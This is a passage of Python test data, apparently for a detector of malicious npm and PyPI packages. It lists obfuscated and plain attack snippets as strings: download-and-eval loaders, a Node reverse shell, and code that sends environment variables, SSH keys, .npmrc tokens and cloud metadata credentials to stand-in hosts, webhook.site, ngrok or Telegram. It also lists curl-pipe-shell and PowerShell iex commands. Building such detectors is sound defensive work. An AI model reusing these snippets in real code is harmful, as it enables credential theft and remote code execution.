    "return Buffer.from(a).toString(s)},a=t=>n(t,s);\n" + ";".join(f'const v{i}=a("{_xor(w, b"utf8", "b64")}")'
                                                                   for i, w in enumerate(XOR_WORDS)) + ";\n",
    # a key that is the 257th distinct literal is not tried; the 256th is
    "Buffer " + "".join(f"'k{i}';" for i in range(256)) + "'utf8'; x ^ y;\n"
    + ",".join(f'a("{_xor(w, b"utf8", "b64")}")' for w in XOR_WORDS),
    "Buffer " + "".join(f"'k{i}';" for i in range(255)) + "'utf8'; x ^ y;\n"
    + ",".join(f'a("{_xor(w, b"utf8", "b64")}")' for w in XOR_WORDS),
    # four calls: too few
    "Buffer s='utf8'; x^y; " + ",".join(f'a("{_xor(w, b"utf8", "b64")}")' for w in XOR_WORDS[:4]),
    # one call in ten may stay unread, not two
    "Buffer s='utf8'; x^y; " + ",".join(f'a("{_xor(w, b"utf8", "b64")}")' for w in XOR_WORDS[:9]) + ',a("x-y")',
    "Buffer s='utf8'; x^y; " + ",".join(f'a("{_xor(w, b"utf8", "b64")}")' for w in XOR_WORDS[:8]) + ',a("x-y"),a("x-y")',
    "Buffer x^y 'k3y!' " + " ".join(f"dec('{_xor(w, b'k3y!', 'hex')}')" for w in XOR_WORDS),
]
DECODED = ["\n", "\n", " ", "  ", "'", '"', "`", "(", ")", "[", "]", ",", ";", "=", " + ", ".", "\\", "\\\n",
           "function g(h) { return h.replace(/../g, m => String.fromCharCode(parseInt(m, 16))); }",
           "const d = (s) => Buffer.from(s, 'base64').toString();", "def unh(x):\n    return bytes.fromhex(x).decode()\n",
           "g('72657175697265')", "g('6178696f73')", "g('706f7374')", "g('7468656e')", "g('7a')", "g('0a')", "g('6')",
           "d('Y2hpbGRfcHJvY2Vzcw==')", "d('Y2hp')", "unh('6f73')", "g(x)", "g",
           "Buffer.from('6f73', 'hex').toString()", "Buffer.from(\"6874747073\", \"hex\").toString('utf8')",
           "Buffer.from('aHR0cHM=', 'base64').toString()", "Buffer.from('zz', 'hex').toString()",
           "atob('ZXZhbA==')", "atob('ZXZhbA=')", "atob(`Y2hpbGRfcHJvY2Vzcw==`)",
           "bytes.fromhex('6f73').decode()", "base64.b64decode('b3M=').decode()", "binascii.unhexlify('6f73').decode()",
           "b64decode(b'cmVxdWVzdHM=').decode('utf-8')", "let hl = [", "const _0x = ['a', 'b'];", "'axios', ",
           "'post'", "'https://x.invalid/a'", "hl[1]", "hl[3]", "hl[0]", "_0x[1]", "hl.push(1)", "hl[2] = 1",
           "require(hl[1])[[hl[2]]](hl[3], { ...process.env })", "[[hl[7]]](r => eval(r.data))",
           "process['env']", "process[\"env\"]", "x['post'](", "['a']", "'ch' + 'ild_process'", "\"ht\" + \"tps\"",
           "os.environ['P'] = ", "os.environ.get('P')", "os.getenv('P', '')", "environ['P']", "process.env['P'] = ",
           "process.env['P']", "process.env.P", "exec(os.getenv('P'))", "eval(process.env['P'])",
           "require(process.env.M)", "requests.get(u).text", "(await axios.get(u)).data", "axios",
           "\n  .post(u, {v})", "\n  .then((r) => {", "\n    eval(r.data);", "\n  })", "subprocess.run(",
           "\n    ['curl', '-sL',", "\n     'https://x.invalid/p.js'],", "\n    capture_output=True)",
           "subprocess.run(['node', '-e', r.stdout])", "new Function.constructor('require', s)",
           "[].constructor.constructor(r.data)", "Object.constructor(c)", "['constructor']['constructor'](c)",
           "open(p, 'wb')", "f.write(r.content)", "f.write(base64.b64decode(b64))", "b64 = 'aW1wb3J0IG9z'",
           "subprocess.run(['/bin/bash', p])", "spawn('node', [f])", "fork(dst)", "os.system('sh ' + p)",
           "subprocess.run([sys.executable, p])", "fs.writeFileSync(f, body)", "execfile(p)", "runpy.run_path(p)",
           "\u00e9", "\U0001F600", "\u0663", "x" * 80]
DECODED_CURATED = [
    # (0.1.8, the follower's adversarial pass) members by name, and a runner handed to a call
    "import requests\nexec(getattr(requests, 'get')('https://c2.invalid/p').text)\n",
    "import requests\nr = requests.get('https://c2.invalid/p')\nexec(r.__dict__['_content'])\n",
    "fetch('https://c2.invalid/p').then((r) => r.text()).then(eval);\n",
    "const https = require('https');\nhttps.get('https://c2.invalid/p', (res) => res.on('data', eval));\n",
    "const vm = require('vm');\nfetch('https://c2.invalid/p').then((r) => r.text()).then(vm.runInThisContext);\n",
    "(async () => { (0, eval)(await (await fetch('https://c2.invalid/p')).text()); })();\n",
    "fetch('https://c2.invalid/p').then((r) => r.text()).then(JSON.parse);\n",
    # the tailwind-book-icon family, hex names through a helper and a constant array
    "\"use strict\";\n\nfunction g(h) { return h.replace(/../g, match => String.fromCharCode(parseInt(match, 16))); }\n\n"
    "let hl = [\n    g('72657175697265'),\n    g('6178696f73'),\n    g('706f7374'),\n"
    "    g('68747470733a2f2f782e696e76616c69642f61'),\n    g('68656164657273'),\n    g('782d7365637265742d686561646572'),\n"
    "    g('736563726574'),\n    g('7468656e'),\n];\n\nconst writer = () => require(hl[1])[[hl[2]]](hl[3], "
    "{ ...process.env }, { [hl[4]]: { [hl[5]]: hl[6] } })[[hl[7]]](r => eval(r.data));\n\nmodule.exports = writer;\n",
    # postman-converters: hex-decoded module names, a member named by a literal
    "(() => {\n  const _0x1a = require(\n    Buffer.from(\"6f73\", \"hex\").toString()\n  );\n  const _0x2b = require(\n"
    "    Buffer.from(\"6874747073\", \"hex\").toString()\n  );\n  const e = Object.fromEntries(Object.keys(process[\"env\"])"
    ".map(k => [k, process[\"env\"][k]]));\n  const req = _0x2b.request({ hostname: 'collector.invalid', method: 'POST' });\n"
    "  req.write(JSON.stringify(e));\n  req.end();\n})();\n",
    # chai-use-chain: Function.constructor runs what a download holds
    "const axios = require('axios');\n(async () => {\n  const s = (await axios.get(src, { headers: { [k]: v } })).data.cookie;\n"
    "  const handler = new Function.constructor(\"require\", s);\n  handler(require);\n})();\n",
    # prettier's fluent chain, and a formatter's call over several rows
    "const axios = require(\"axios\");\n(async ()=> {\n    try {\n        axios\n            .post(\"https://x.invalid/a\", {version })\n"
    "            .then((r) => {\n                // c\n                eval(r.data.model);\n            });\n    } catch (e) {}\n})();\n",
    "import subprocess\nif True:\n    r = subprocess.run(\n        ['curl', '-sL',\n         'https://x.invalid/p.js'],\n"
    "        capture_output=True, text=True, timeout=10\n    )\n    if r.stdout:\n        subprocess.run(['node', '-e', r.stdout],\n"
    "                       capture_output=True, timeout=30)\n",
    # a received value carried by environment variables
    "import os, requests\nos.environ['P'] = requests.get(u).text\nexec(os.getenv('P'))\n",
    "const axios = require('axios');\n(async () => {\n  process.env['M'] = (await axios.get(u)).data;\n  require(process.env['M']);\n})();\n",
    # ptmpl and litellm: a script downloaded, or decoded, written and run with an interpreter
    "import subprocess, os, requests\n\ndef download_and_run_script():\n    script_url = 'https://x.invalid/s.sh'\n"
    "    script_path = os.path.join(os.path.expanduser('~'), 's.sh')\n    response = requests.get(script_url)\n"
    "    with open(script_path, 'wb') as file:\n        file.write(response.content)\n    os.chmod(script_path, 0o755)\n"
    "    subprocess.run(['/bin/bash', script_path, '--restore'])\n",
    "import subprocess, base64, sys, tempfile, os\n\nb64_payload = \"aW1wb3J0IG9zCg==\"\n\n"
    "with tempfile.TemporaryDirectory() as d:\n    p = os.path.join(d, \"p.py\")\n    with open(p, \"wb\") as f:\n"
    "        f.write(base64.b64decode(b64_payload))\n    \n    subprocess.run([sys.executable, p])\n",
    "const b = Buffer.from(blob, 'base64');\nfs.writeFileSync(f, b);\nspawn(f, [], { detached: true });\n",
    # the MAJOR shapes: a download written and required, or started by its path
    "const body = await (await fetch(u)).text();\nfs.writeFileSync('m.js', body);\nrequire('./m.js');\n",
    "import os, requests\nd = requests.get(u).content\nopen('r.sh', 'wb').write(d)\nos.system('r.sh')\n",
    # more reasons only the decoded strings show
    "const cp = require(atob('Y2hpbGRfcHJvY2Vzcw=='));\nconst h = require(atob('aHR0cHM='));\n"
    "h.get(u, (res) => { let b = ''; res.on('data', (c) => { b += c; }); res.on('end', () => cp.execSync(b)); });\n",
    "import os\nrq = __import__(bytes.fromhex('7265717565737473').decode())\nexec(rq.get(u).text)\n",
    "const n = require('ne' + 't');\nconst s = new n.Socket();\ns.connect(4444, '10.0.0.1', () => {\n"
    "  const sh = require('child' + '_process').spawn('/bin/sh', []);\n  s.pipe(sh.stdin);\n  sh.stdout.pipe(s);\n});\n",
    "const o = require(Buffer.from('6f73', 'hex').toString());\nrequire('https').get('https://abc.oastify.com/?h=' + o['hostname']());\n",
    "function dec(s) { return Buffer.from(s, 'base64').toString(); }\nconst f = require(dec('ZnM='));\n"
    "const t = f.readFileSync(require('path').join(require('os').homedir(), dec('Lm5wbXJj')), 'utf8');\n"
    "fetch('https://collector.invalid', { method: 'POST', body: t + '_authToken' });\n",
]
# (0.1.8) character codes: literal codes (String.fromCharCode, ''.join(map(chr, …)),
# bytes([…]).decode()), and the file's own decoders over codes or text —
# their walks, transforms, keys and calls — and what is not read: codes out of
# range or past 32 bits, a changed array, a call with a name for an argument


def _cc_fnos(text, bias):
    return ",".join(str(ord(ch) ^ (((i + bias) * 13 + 7) & 0xff)) for i, ch in enumerate(text))


def _cc_xor(text, key):
    return ",".join(str(ord(ch) ^ ord(key[i % len(key)])) for i, ch in enumerate(text))


CC_FNOS = ("function decodeBuffer(buffer, bias) {\n  var assembled = '';\n"
           "  for (var pos = 0; pos < buffer.length; pos++) {\n"
           "    assembled += String.fromCharCode(buffer[pos] ^ ((pos + bias) * 13 + 7 & 0xff));\n  }\n"
           "  return assembled;\n}\n")
CC_MAP = "const dec = (a) => a.map((c) => String.fromCharCode(c - 3)).join('');\n"
CC_SPLIT = "function r(s){return s.split('').map(function(c){return String.fromCharCode(c.charCodeAt(0) - 1)}).join('')}\n"
CC_SPREAD = "const q = (a, k) => String.fromCharCode(...a.map((c, i) => c ^ k.charCodeAt(i % k.length)));\n"
CC_PY_RANGE = "def d(a, k):\n    return ''.join(chr(a[i] ^ k) for i in range(len(a)))\n"
CC_PY_ENUM = "def f(a, k):\n    return ''.join(chr(c ^ ord(k[i % len(k)])) for i, c in enumerate(a))\n"
CC_PY_ITER = "def e(s):\n    out = ''\n    for c in s:\n        out += chr(ord(c) - 1)\n    return out\n"
CC_CALLS = [f"decodeBuffer([{_cc_fnos('telemetry', 7)}], 7)", f"decodeBuffer([{_cc_fnos('runner.js', 3)}], 3)",
            f"dec([{','.join(str(ord(ch) + 3) for ch in 'child_process')}])", "r('fyfd')", "r('dijme`qspdftt')",
            f"q([{_cc_xor('https://c2.invalid/p', 'k3y')}], 'k3y')", f"d([{_cc_xor('os', chr(7))}], 7)",
            f"f([{_cc_xor('subprocess', 'k3y')}], 'k3y')", "e('fybn')", "e('pt')",
            f"decodeBuffer(_w, 7)", f"_w = [{_cc_fnos('runner.js', 7)}]", "_w.push(1)", "decodeBuffer(x, 7)",
            "decodeBuffer([1,2,3], k)", "dec([0x6b, 0x6c])", "dec([2147483647])", "dec([])", "q([1], '')", "e('\\x')"]
CHARCODE = ["\n", "\n", " ", ";", ",", "(", ")", "[", "]", "{", "}", "'", '"', "=", "+", "-", "^", "&", "%", "~", "0x",
            "String.fromCharCode(", "String.fromCharCode(...[", ".apply(null, [", "chr(", "''.join(", "map(chr, ",
            "bytes([", "bytearray((", ".decode()", ".decode('utf-8')", "for c in ", "for i in range(len(a))",
            "for (var i = 0; i < a.length; i++)", "for (let j = 0; j < s.length; j++)", "a.map((c, i) => ",
            "s.split('').map(function(c){return ", "for i, c in enumerate(a)", "function d(a, k) {",
            "const e = (a) => ", "def g(a, k):\n    return ", "a[i]", "a[i] ^ k", "c ^ 7", "c.charCodeAt(0)",
            "k.charCodeAt(i % k.length)", "ord(c)", "ord(k[i % len(k)])", "(i + k) * 13 + 7 & 0xff", ">>> 1", "<< 2",
            "<< 40", ">> 1", "% 256", "a.length", "len(k)", "104,105", "0x68, 0x69", "10", "99999999999", "0xffffffff",
            "2147483647", "'hi'", '"hi"', "7", "-3", "\u00e9", "\U0001F600",
            "String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)", "String.fromCharCode(...[101,118,97,108])",
            "String.fromCharCode.apply(null, [101,120,101,99])", "''.join(map(chr, [111, 115]))",
            "''.join(chr(c) for c in [115,117,98,112,114,111,99,101,115,115])", '"".join([chr(x) for x in (101,118,97,108)])',
            "bytes([111,115]).decode()", "bytearray([0x6f,0x73]).decode('utf-8')", "String.fromCharCode(7,8)",
            "require(", "spawn(process.execPath, [path.join(__dirname, ", "exec(", "__import__(", "eval(",
            CC_FNOS, CC_MAP, CC_SPLIT, CC_SPREAD, CC_PY_RANGE, CC_PY_ENUM, CC_PY_ITER, *CC_CALLS, *CC_CALLS,
            # a decoder and a call of it
            *[CC_FNOS + CC_CALLS[0], CC_MAP + CC_CALLS[2], CC_SPLIT + CC_CALLS[3], CC_SPREAD + CC_CALLS[5],
              CC_PY_RANGE + CC_CALLS[6], CC_PY_ENUM + CC_CALLS[7], CC_PY_ITER + CC_CALLS[9]] * 3]
# (0.1.8) exfiltration as a data flow: where local data is read, the names it is given, the requests that
# send it (their data and their addresses), commands read as programs, shell scripts, a webhook's secret,
# and where the data goes (an alphabet of its own)
FLOW = ["\n", "\n", " ", "'", '"', "`", "(", ")", "[", "]", ",", ";", "=", "{", "}", ".", "+", ":", "\\", "$",
        "process.env.NPM_TOKEN", "process.env.HOME", "process.env", "{ ...process.env }", "os.environ",
        "os.environ['AWS_SECRET_ACCESS_KEY']", "dict(os.environ)", "os.getenv('USER')", "os.hostname()",
        "os.userInfo().username", "os.homedir()", "os.networkInterfaces()", "socket.gethostname()",
        "const { hostname } = require('os');\n", "from getpass import getuser as gu\n", "hostname()", "gu()",
        "require('os').hostname()", "tryGet(os.hostname)", "fs.readFileSync(", "open(", "'/etc/passwd'",
        "'.env'", "path.join(os.homedir(), '.npmrc')", "os.path.expanduser('~/.aws/credentials')",
        "execSync('whoami')", "subprocess.check_output(['id'])", "'http://169.254.169.254/latest/meta-data/'",
        "requests.get('https://api.ipify.org').text", "const d = ", "h = ", "x = ", "data = ", "d", "h", "x",
        "data", "e", "def send(url, data=None):\n    ", "function send(u, b) { ", "send(", "data=", "json=",
        "return ", "return {\n    'h': ", "=> ", "async ", "fetch(", "fetch('https://x.invalid/', ",
        "{ method: 'POST', body: ", "{ headers: { Authorization: ", "{ env: ", "axios.post('https://x.invalid/', ",
        "requests.post('https://x.invalid/', ", "urllib.request.Request(url, data=", "urlopen(",
        "https.get('https://x.invalid/?h=' + ", "https.request(o).end(", "const req = https.request(o);\n",
        "req.write(", "req.data = ", "dns.lookup(", "socket.getaddrinfo(", "'.x.invalid.com'",
        "'https://' + ", "`https://${", "}.x.invalid.com/`", "o.headers.Authorization = ", "spawn('curl', [",
        "os.system('curl -d \"$(whoami)\" https://x.invalid/')\n", "exec(`curl https://x.invalid/?u=$(whoami)`)\n",
        "const cmd = `curl -F f=@/etc/passwd https://x.invalid/`;\nexec(cmd);\n", "curl -d \"$(env)\" ",
        "H=$(hostname)\n", "wget -qO- https://x.invalid/?h=$H\n", "| while read v;do nslookup $v.x.invalid.com;done",
        "https://webhook.site/0", "https://requestbin.net/r/a", "https://abc123.ngrok-free.app/",
        "http://203.0.113.9/c", "https://api.telegram.org/bot", "'https://hooks.x.invalid/in/" + _KEY + "'",
        "x.open('POST', ", "TOKEN = '" + _TG + "'\n", "f'https://api.telegram.org/bot{TOKEN}/sendMessage'",
        "module.exports = { h };\n", ".encode()", ".toString()", "JSON.stringify(", "json.dumps(", "\U0001F600",
        "\u00e9", "typeof ", "!", " === 'x'", " && ", " ? 1 : 0", " if ", " else ", "Object.entries(process.env)",
        ".filter(([k]) => k.startsWith('X_'))", ".filter(([k]) => !k.startsWith('npm_'))", "os.environ.items()",
        "async fetch(t) { ", "cache.fetch(", "window.fetch(", "os.environ.get('NPM_TOKEN')", "'.ssh/id_rsa.pub'",
        "urlopen('https://x.invalid/', data=", "'curl -fsSL https://x.invalid/i.sh | bash'", "execSync(", "console.log(",
        "'powershell -c \"irm https://x.invalid/i.ps1 | iex\"'", "__spreadValues({}, process.env)",
        "spawn('npm', ['i'], ", "require('fs').readFileSync("]
FLOW_CURATED = [
    # PowerShell handed to an exec call by a name given the command line
    "import subprocess\nout = 'C:/x/a.exe'\n"
    "dl = f\"powershell -Command \\\"Invoke-WebRequest -Uri 'https://x.invalid/a.exe' -OutFile '{out}'\\\"\"\n"
    "subprocess.run(dl, shell=True)\nrun = f\"powershell -Command \\\"Start-Process '{out}'\\\"\"\n"
    "subprocess.run(run, shell=True)\n",
    "const c = 'powershell -c \"iwr https://x.invalid/p.ps1 | iex\"';\nrequire('child_process').execSync(c);\n",
    "const help = 'run: powershell -c \"irm https://x.invalid/i.ps1 | iex\"';\nconsole.log(help);\n",
    # a callback handed a send is code run later, not data sent (a name reused in it is another variable)
    "const r = require('os').hostname();\nhttps.get(url, { headers: {} }, (r) => { r.pipe(f); });\n",
    "const h = require('os').hostname();\nhttps.get(url, res => { const r = h; send(r) });\n",
    "const h = require('os').hostname();\nhttps.request(u, { method: 'POST', onDone: function () { log(h); } });\n",
    "const h = require('os').hostname();\nhttps.get('https://x.invalid/?h=' + h, res => {});\n",
    # read, followed and sent (install time: the flow alone; import time: to a capture service or an IP)
    "const { hostname } = require('os');\nfetch('https://x.invalid/', { method: 'POST', body: hostname() });\n",
    "from socket import gethostname as gh\nimport requests\nrequests.post('https://webhook.site/0', data=gh())\n",
    "fetch('https://x.invalid/', { method: 'POST', body: process.env.NPM_TOKEN });\n",
    "fetch('https://x.invalid/', { headers: { Authorization: process.env.NPM_TOKEN } });\n",
    "const https = require('https');\nhttps.get('https://webhook.site/r/abc?d=' + process.env.NPM_TOKEN);\n",
    "const https = require('https');\nhttps.get('https://mirror.x.invalid/d?t=' + process.env.NPM_TOKEN);\n",
    "const e = { ...process.env };\nfetch('https://x.invalid/', { method: 'POST', body: JSON.stringify(e) });\n",
    "const env = process.env;\nfetch('https://x.invalid/', { method: 'POST', body: env.HOME });\n",
    "import os, json, requests\nd = json.dumps(dict(os.environ))\nrequests.post('https://x.invalid/', data=d.encode())\n",
    "const fs = require('fs');\nconst k = fs.readFileSync('/etc/passwd', 'utf8');\n"
    "fetch('https://x.invalid/', { method: 'POST', body: k });\n",
    "const os = require('os'), path = require('path'), fs = require('fs');\nconst p = path.join(os.homedir(), '.npmrc');\n"
    "axios.post('https://x.invalid/', fs.readFileSync(p));\n",
    "const fs = require('fs');\nconst d = fs.readFileSync('.env', 'utf8');\n"
    "fetch('https://abcd.ngrok-free.app/', { method: 'POST', body: d });\n",
    "const { execSync } = require('child_process');\nconst u = execSync('whoami').toString();\n"
    "fetch('https://x.invalid/', { method: 'POST', body: u });\n",
    "const os = require('os');\nfetch('https://webhook.site/0', { method: 'POST', body: os.homedir() });\n",
    "import requests\ntok = requests.get('http://169.254.169.254/latest/meta-data/iam/security-credentials/r').text\n"
    "requests.post('https://x.invalid/', data=tok)\n",
    "import requests\nip = requests.get('https://api.ipify.org').text\nrequests.post('https://webhook.site/0', json={'ip': ip})\n",
    "import requests\nip = requests.get('https://ipinfo.io/json').json()\nrequests.get(MIRRORS[ip['country']])\n",
    "import socket\nh = socket.gethostname()\nq = h + '.x.invalid.com'\nsocket.getaddrinfo(q, 80)\n",
    "import socket\nh = socket.gethostname()\nsocket.getaddrinfo(h, 80)\n",
    "import os, json, urllib.request\ndef send(url, data=None):\n    req = urllib.request.Request(url)\n"
    "    req.data = data.encode()\n    urllib.request.urlopen(req)\nsend('https://webhook.site/0', data=json.dumps(dict(os.environ)))\n",
    "import socket, requests\ndef info():\n    return {\n        'h': socket.gethostname(),\n    }\n"
    "requests.post('https://x.invalid/', json=info())\n",
    "const os = require('os');\nconst h = () => os.hostname();\nfetch('https://x.invalid/', { method: 'POST', body: h() });\n",
    "const os = require('os');\nfunction h() { return os.hostname(); }\nmodule.exports = { h };\n"
    "fetch('https://x.invalid/', { method: 'POST', body: JSON.stringify(module.exports) });\n",
    "const os = require('os'), fs = require('fs');\nconst p = '/tmp/x-' + os.userInfo().username + '.log';\n"
    "const h = fs.readFileSync(p);\nfetch('https://x.invalid/', { method: 'POST', body: h });\n",
    "const o = { headers: {} };\no.headers.Authorization = process.env.NPM_TOKEN;\nfetch('https://x.invalid/', o);\n",
    "const { spawn } = require('child_process');\nspawn('curl', ['https://x.invalid/'], { env: { ...process.env } });\n",
    "const os = require('os');\nconst u = 'https://' + os.hostname() + '.x.invalid.com/';\nlib.check(u);\n",
    "const os = require('os');\nconst h = os.hostname();\nnet.probe(`https://${h}.x.invalid.com/`);\n",
    "const https = require('https');\nconst e = JSON.stringify(process.env);\nhttps.request(o).end(e);\n",
    "require('https').get('https://x.invalid/?h=' + require('os').hostname());\n",
    "const os = require('os');\nconst d = { h: tryGet(os.hostname) };\n"
    "fetch('https://x.invalid/', { method: 'POST', body: JSON.stringify(d) });\n",
    "const req = require('https').request('https://x.invalid/', { method: 'POST' }, () => {});\n"
    "req.end(JSON.stringify({ h: require('os').hostname() }));\n",
    # command lines a script hands a shell, and shell scripts
    "import os\nos.system('curl -d \"$(whoami)\" https://x.invalid/')\n",
    "const { exec } = require('child_process');\nexec(`curl -F \"f=@/etc/passwd\" https://x.invalid/`);\n",
    "const { exec } = require('child_process');\nconst cmd = `curl https://x.invalid/?u=$(whoami)`;\nexec(cmd);\n",
    "const { exec } = require('child_process');\nconst s = `curl -s https://webhook.site/x -d \"$(env)\"`;\n"
    "exec('echo 1;' + s);\n",
    "import os\nos.system(\"t=$(curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/x);"
    " curl -d \\\"$t\\\" https://x.invalid/\")\n",
    "import os\nos.system(\"a=$(hostname;whoami) && echo $a | xxd -p | while read ut;do nslookup $ut.x.invalid.com;done\")\n",
    "import os\nos.system('curl -d \"$(curl -s https://ifconfig.me)\" https://x.invalid/')\n",
    "#!/bin/sh\ncurl -d \"$(env)\" https://x.invalid/\n",
    "cat ~/.ssh/id_rsa | curl -X POST --data-binary @- https://x.invalid/\n",
    "H=$(hostname)\nwget -q -O- https://x.invalid/?h=$H\n",
    "export T=$(printenv)\ncurl -d \"$T\" https://webhook.site/0\n",
    "V=$(node -v)\ncurl -fsSL https://x.invalid/dl/$V/bin -o bin\n",
    # a webhook whose secret is written in the code, any service
    "import requests\nHOOK = 'https://hooks.x.invalid/in/" + _KEY + "'\ndef send(url, payload):\n"
    "    return requests.post(url, json=payload)\nsend(HOOK, {'m': 1})\n",
    "const x = new XMLHttpRequest();\nx.open('POST', 'https://in.x.invalid/w/" + _KEY + "');\nx.send(d);\n",
    "import requests\nTOKEN = '" + _TG + "'\nrequests.get(f'https://api.telegram.org/bot{TOKEN}/sendMessage?text={m}')\n",
    "import requests\nrequests.post('https://x.invalid/api/v2/GetUserProfileInformation')\n",
    "import requests\nrequests.get('https://x.invalid/blog/my-project-release-notes-2024')\n",
    # where the data goes, at import time
    "import socket, requests\nrequests.post('https://requestbin.net/r/abc', data=socket.gethostname())\n",
    "const os = require('os');\nfetch('https://abc123.ngrok-free.app/', { method: 'POST', body: JSON.stringify(os.networkInterfaces()) });\n",
    "const fs = require('fs');\nconst k = fs.readFileSync('/root/.ssh/id_rsa');\n"
    "fetch('https://webhook.site/0', { method: 'POST', body: k });\n",
    "import socket, requests\nrequests.post('http://203.0.113.9/c', data=socket.gethostname())\n",
    "import os, json, requests\nrequests.post('https://api.telegram.org/bot/sendMessage', data=json.dumps(dict(os.environ)))\n",
    "import os, requests\nrequests.post('https://api.telegram.org/bot/sendMessage', data={'t': os.environ['TG_TOKEN']})\n",
    "import os, requests\nrequests.post('http://198.51.100.7/c', data=os.environ['NPM_TOKEN'])\n",
    "import requests\nip = requests.get('https://api.ipify.org').text\nrequests.post('http://203.0.113.9/c', data=ip)\n",
    "const { exec } = require('child_process');\nexec(`curl -X POST \"https://7195e44e.ngrok-free.app/$(ls /)\"`);\n",
    # the instance's metadata sent (install time)
    "const r = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/');\n"
    "const t = await r.text();\nawait fetch('https://x.invalid/', { method: 'POST', body: t });\n",
    'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | curl -X POST --data-binary @- https://x.invalid/\n',
    'import os\nos.system(\'curl -d "$(curl -s http://169.254.169.254/latest/meta-data/)" https://x.invalid/\')\n',
    "T=$(curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token)\n"
    'curl -d "$T" https://x.invalid/\n',
    # local files sent to a capture service or to an IP address (import time)
    "const fs = require('fs');\nconst k = fs.readFileSync('/home/u/.ssh/id_ed25519');\n"
    "fetch('https://webhook.site/0', { method: 'POST', body: k });\n",
    "import requests\nrequests.post('https://abc.ngrok-free.app/u', files={'f': open('/etc/hosts', 'rb')})\n",
    "const fs = require('fs');\nconst d = fs.readdirSync('/home');\naxios.post('https://requestbin.net/r/a', d);\n",
    "import requests\nwith open('/etc/shadow') as f:\n    requests.post('https://webhook.site/1', data=f.read())\n",
    "const fs = require('fs');\nconst d = fs.readFileSync('/etc/passwd');\n"
    "fetch('http://203.0.113.9/c', { method: 'POST', body: d });\n",
    "import requests\nrequests.post('http://198.51.100.7/u', data=open('/root/.aws/credentials').read())\n",
    "const fs = require('fs'), os = require('os');\nconst k = fs.readFileSync(os.homedir() + '/.npmrc');\n"
    "axios.post('http://203.0.113.9/n', k);\n",
    # the public IP address sent to a capture service or to an IP address (import time)
    "const r = await fetch('https://api.ipify.org');\nconst ip = await r.text();\n"
    "await fetch('https://webhook.site/0', { method: 'POST', body: ip });\n",
    "import requests\nip = requests.get('https://icanhazip.com').text\n"
    "requests.post('https://abc.ngrok-free.app/', data=ip)\n",
    "import urllib.request\nip = urllib.request.urlopen('https://ifconfig.me').read()\n"
    "urllib.request.urlopen('https://requestbin.net/r/x', data=ip)\n",
    "const r = await fetch('https://ipinfo.io/ip');\nconst ip = await r.text();\n"
    "await fetch('http://203.0.113.9/i', { method: 'POST', body: ip });\n",
    "import requests\nip = requests.get('https://checkip.amazonaws.com').text\n"
    "requests.post('http://192.0.2.1/i', json={'ip': ip})\n",
    "from urllib.request import urlopen\nip = urlopen('https://ident.me').read()\n"
    "urlopen('http://203.0.113.5/', data=ip)\n",
    "import requests\nip = requests.get('https://wtfismyip.com/text').text\n"
    "requests.put('http://198.51.100.7/p', data=ip)\n",
    # what the machine reports, sent to an IP address or a capture service (import time)
    "const os = require('os');\n"
    "fetch('http://203.0.113.9/r', { method: 'POST', body: JSON.stringify(os.networkInterfaces()) });\n",
    "import os, requests\nrequests.post('http://198.51.100.7/r', data=os.popen('ls -la /').read())\n",
    "const { execSync } = require('child_process');\nconst u = execSync('ls /home').toString();\n"
    "fetch('http://203.0.113.9/', { method: 'POST', body: u });\n",
    "const os = require('os');\naxios.post('http://192.0.2.10/h', { home: os.homedir() });\n",
    "const os = require('os');\n"
    "fetch('https://webhook.site/0', { method: 'POST', body: JSON.stringify(os.networkInterfaces()) });\n",
    "import os, requests\nrequests.post('https://abc.ngrok-free.app/r', data=os.popen('ls /home').read())\n",
    # tested, not used; a definition or a cache's fetch; the environment a condition narrows; a public key
    "const hs = typeof process == 'object' && process ? typeof process.env == 'object' && process.env && process.env.DEBUG || 'x' : 'posix';\n"
    "fetch('https://x.invalid/', { method: 'POST', body: hs });\n",
    'class C { async fetch(t, e = {}) { return process.env; } }\n',
    'const v = cache.fetch(k, { context: process.env });\n',
    "window.fetch('https://x.invalid/', { method: 'POST', body: JSON.stringify(process.env) });\n",
    "const s = Object.fromEntries(Object.entries(process.env).filter(([k]) => k.startsWith('X_')));\n"
    "fetch('https://x.invalid/', { method: 'POST', body: JSON.stringify(s) });\n",
    "const s = Object.entries(process.env).filter(([k]) => !k.startsWith('npm_'));\n"
    "fetch('https://x.invalid/', { method: 'POST', body: JSON.stringify(s) });\n",
    "import os, requests\nd = {k: v for k, v in os.environ.items() if 'TOKEN' in k}\n"
    "requests.post('https://x.invalid/', json=d)\n",
    "import os, requests\nd = {k: v for k, v in os.environ.items() if k.startswith('X_')}\n"
    "requests.post('https://x.invalid/', json=d)\n",
    "const fs = require('fs'), os = require('os'), path = require('path');\n"
    "const key = fs.readFileSync(path.join(os.homedir(), '.ssh/id_ed25519.pub'));\n"
    "fetch('https://api.telegram.org/bot/sendDocument', { method: 'PUT', body: key });\n",
    "const fs = require('fs'), os = require('os'), path = require('path');\n"
    "const key = fs.readFileSync(path.join(os.homedir(), '.ssh/id_ed25519'));\n"
    "fetch('https://api.telegram.org/bot/sendDocument', { method: 'PUT', body: key });\n",
    "const t = process.env.GITHUB_TOKEN ? 'yes' : 'no';\nfetch('https://x.invalid/', { method: 'POST', body: t });\n",
    "if (!process.env.NPM_TOKEN) fetch('https://x.invalid/', { method: 'POST', body: 'none' });\n",
    "import os, requests\nt = 'set' if os.environ.get('NPM_TOKEN') is not None else ''\n"
    "requests.post('https://x.invalid/', data=t)\n",
    # a command runs when it is handed to an exec call: help text and error messages run nothing
    "console.log('Install with: curl -fsSL https://x.invalid/i.sh | sh');\n",
    "const s = os === 'win32' ? 'powershell -c \"irm https://x.invalid/i.ps1 | iex\"' : 'curl -fsSL https://x.invalid/i | bash';\n"
    "throw new Error(`install with ${s}`);\n",
    "const { execSync } = require('child_process');\nexecSync('curl -s https://x.invalid/i.sh | sh');\n",
    "const c = 'curl -s https://x.invalid/i.sh | sh';\nrequire('child_process').execSync(c);\n",
    "import subprocess\nsubprocess.run(['powershell', '-c', 'irm https://x.invalid/i.ps1 | iex'])\n",
    "import os\nos.system('sh -c \"$(curl -fsSL https://x.invalid/i.sh)\"')\n",
    "print('sh -c \"$(curl -fsSL https://x.invalid/i.sh)\"')\n",
